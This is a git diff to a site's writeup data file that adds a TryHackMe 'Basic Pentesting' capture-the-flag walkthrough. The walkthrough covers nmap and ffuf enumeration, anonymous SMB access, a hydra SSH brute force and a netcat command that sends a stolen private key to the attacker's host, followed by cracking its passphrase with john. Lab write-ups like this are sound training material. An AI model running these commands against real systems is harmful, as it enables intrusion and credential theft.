@@ -1,6 +1,6 @@
-// "gaming-server" is a real, condensed writeup. Everything else in this
-// file is still placeholder content used to design the layout, pending
-// conversion from raw notes.
+// "gaming-server" and "basic-pentesting" are real, condensed writeups.
+// Everything else in this file is still placeholder content used to
+// design the layout, pending conversion from raw notes.
 
 export type MachinePhase = {
   title: string;
@@ -278,6 +278,231 @@ loot actually lives:
 
 ![root.txt located under /mnt/root, the mounted host filesystem](/writeups/gaming-server/privesc-root-flag-location.png)
 `,
+      },
+    ],
+  },
+  {
+    slug: "basic-pentesting",
+    name: "Basic Pentesting",
+    platform: "TryHackMe",
+    difficulty: "Easy",
+    os: "Linux",
+    date: "2026-07-03",
+    tags: [
+      "nmap",
+      "smb",
+      "ffuf",
+      "hydra",
+      "ssh-key-crack",
+      "john",
+      "lateral-movement",
+    ],
+    summary:
+      "A TryHackMe Linux box where an HTTP dev-notes leak and anonymous SMB access surface two usernames, a brute-forced SSH password gets a foothold as one of them, and a world-readable SSH key leads to lateral movement into the other.",
+    phases: [
+      {
+        title: "Recon",
+        body: `\`\`\`shell
+$ nmap -p- -T4 -sV -sC -oN nmap 10.49.191.54
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8080/tcp open  http        Apache Tomcat 9.0.7
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+\`\`\`
+
+Two SMB ports alongside SSH and a stock Apache/Tomcat pair &mdash; SMB is
+most likely an attack vector.`,
+      },
+      {
+        title: "Enumeration",
+        body: `The port 80 site is just a placeholder, but its HTML source hints at
+where the real content lives:
+
+![Homepage showing an "Undergoing maintenance" placeholder message](/writeups/basic-pentesting/enum-http-homepage.png)
+
+\`\`\`html
+<!-- Check our dev note section if you need to know what to work on. -->
+\`\`\`
+
+![Page source revealing the HTML comment about a dev note section](/writeups/basic-pentesting/enum-http-view-source.png)
+
+Fuzzing for that "dev note section" turns up \`/development\`:
+
+\`\`\`shell
+$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.49.191.54/FUZZ -e .html
+development             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 30ms]
+\`\`\`
+
+![Directory listing for /development showing dev.txt and j.txt](/writeups/basic-pentesting/enum-development-listing.png)
+
+Both files are internal dev notes, and name two users right away:
+
+\`\`\`text
+For J:
+
+I've been auditing the contents of /etc/shadow to make sure we don't
+have any weak credentials, and I was able to crack your hash really
+easily. You know our password policy, so please follow it? Change
+that password ASAP.
+
+-K
+\`\`\`
+
+![j.txt: K warning J about a weak, easily-cracked password](/writeups/basic-pentesting/enum-development-jtxt.png)
+
+\`\`\`text
+2018-04-23: I've been messing with that struts stuff, and it's pretty
+cool! ... using version 2.5.12, because other versions were giving me
+trouble. -K
+
+2018-04-22: SMB has been configured. -K
+
+2018-04-21: I got Apache set up. Will put in our content later. -J
+\`\`\`
+
+![dev.txt: K and J's dev log, confirming SMB is configured](/writeups/basic-pentesting/enum-development-devtxt.png)
+
+With SMB confirmed live, anonymous access is the next thing to check:
+
+\`\`\`shell
+$ smbclient -N -L //10.49.184.181
+Sharename       Type      Comment
+Anonymous       Disk
+IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
+
+$ smbclient -U kay //10.49.184.181/Anonymous
+Password for [WORKGROUP\\kay]:
+smb: \\> ls
+staff.txt
+smb: \\> get staff.txt
+\`\`\`
+
+![smbclient listing the Anonymous share and pulling staff.txt](/writeups/basic-pentesting/enum-smb-anonymous-listing.png)
+
+\`staff.txt\` names the second user and a target for a password guess:
+
+\`\`\`text
+Announcement to staff:
+
+PLEASE do not upload non-work-related items to this share. I know
+it's all in fun, but this is how mistakes happen. (This means you
+too, Jan!)
+
+-Kay
+\`\`\`
+
+![staff.txt: Kay calling out Jan for uploading non-work files](/writeups/basic-pentesting/enum-smb-stafftxt.png)
+
+Between the dev notes (K, J) and the staff announcement (Kay, addressed
+to Jan), two real usernames fall out: \`kay\` and \`jan\`.`,
+      },
+      {
+        title: "Foothold",
+        body: `With a valid username and no working password yet, \`hydra\` against SSH
+is the next move:
+
+\`\`\`shell
+$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.49.184.181 ssh
+[22][ssh] host: 10.49.184.181   login: jan   password: armando
+\`\`\`
+
+![hydra finding jan's SSH password as "armando"](/writeups/basic-pentesting/foothold-hydra-ssh-crack.png)
+
+\`\`\`shell
+$ ssh jan@10.48.156.54
+jan@10.48.156.54's password: armando
+Welcome to Ubuntu 20.04.6 LTS
+\`\`\`
+
+![Logged in over SSH as jan](/writeups/basic-pentesting/foothold-ssh-login-jan.png)
+
+jan's own home directory is empty aside from an unreadable \`.lesshst\`,
+so the next stop is the other user found during enumeration:
+
+\`\`\`shell
+jan@ip-10-48-156-54:~$ cd ..
+jan@ip-10-48-156-54:/home$ ls
+jan  kay  ubuntu
+jan@ip-10-48-156-54:/home$ cd kay
+jan@ip-10-48-156-54:/home/kay$ ls -la
+-rw------- 1 kay  kay    57 pass.bak
+drwxr-xr-x 2 kay  kay  4096 .ssh
+\`\`\`
+
+![Poking around jan's home directory, then kay's](/writeups/basic-pentesting/foothold-jan-home-enum.png)
+
+![Directory listing for kay's home, showing pass.bak and .ssh](/writeups/basic-pentesting/foothold-kay-home-listing.png)
+
+\`pass.bak\` is unreadable as jan, but \`.ssh\` isn't, and its private key
+is sitting there world-readable:
+
+\`\`\`shell
+jan@ip-10-48-156-54:/home/kay$ cd .ssh
+jan@ip-10-48-156-54:/home/kay/.ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+...
+\`\`\`
+
+![Reading kay's world-readable id_rsa from jan's shell](/writeups/basic-pentesting/foothold-kay-ssh-key-leak.png)`,
+      },
+      {
+        title: "Lateral movement",
+        body: `The key is passphrase-protected, so it needs to come back to the
+attacking box to crack offline. Netcat moves it over:
+
+\`\`\`shell
+# on the target, as jan
+$ nc 192.168.151.91 1234 < id_rsa
+
+# on the attacker box
+$ nc -lvnp 1234 > id_rsa
+$ chmod 600 id_rsa
+\`\`\`
+
+![Netcat pulling id_rsa across and chmod-ing it locally](/writeups/basic-pentesting/lateral-netcat-key-transfer.png)
+
+\`\`\`shell
+$ ssh kay@10.48.156.54 -i id_rsa
+Enter passphrase for key 'id_rsa':
+\`\`\`
+
+![SSH prompting for id_rsa's passphrase, confirming it's protected](/writeups/basic-pentesting/lateral-ssh-key-passphrase-prompt.png)
+
+Same offline-crack approach as the earlier SSH key &mdash; \`ssh2john\`
+plus \`john\` against \`rockyou.txt\`:
+
+\`\`\`shell
+$ ssh2john id_rsa > hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+beeswax          (id_rsa)
+\`\`\`
+
+![john cracking id_rsa's passphrase as "beeswax"](/writeups/basic-pentesting/lateral-john-crack-passphrase.png)
+
+\`\`\`shell
+$ ssh kay@10.48.143.202 -i id_rsa
+Enter passphrase for key 'id_rsa': beeswax
+kay@ip-10-48-143-202:~$ cat pass.bak
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+\`\`\`
+
+![Logged in over SSH as kay using the cracked key](/writeups/basic-pentesting/lateral-ssh-login-kay.png)
+
+![cat pass.bak revealing the box's final password](/writeups/basic-pentesting/lateral-final-password.png)
+
+\`pass.bak\` in kay's home directory holds the box's final password
+&mdash; the thing K's dev-note comment about auditing \`/etc/shadow\` and
+Jan's own leaked password were ultimately pointing at.`,
       },
     ],
   },
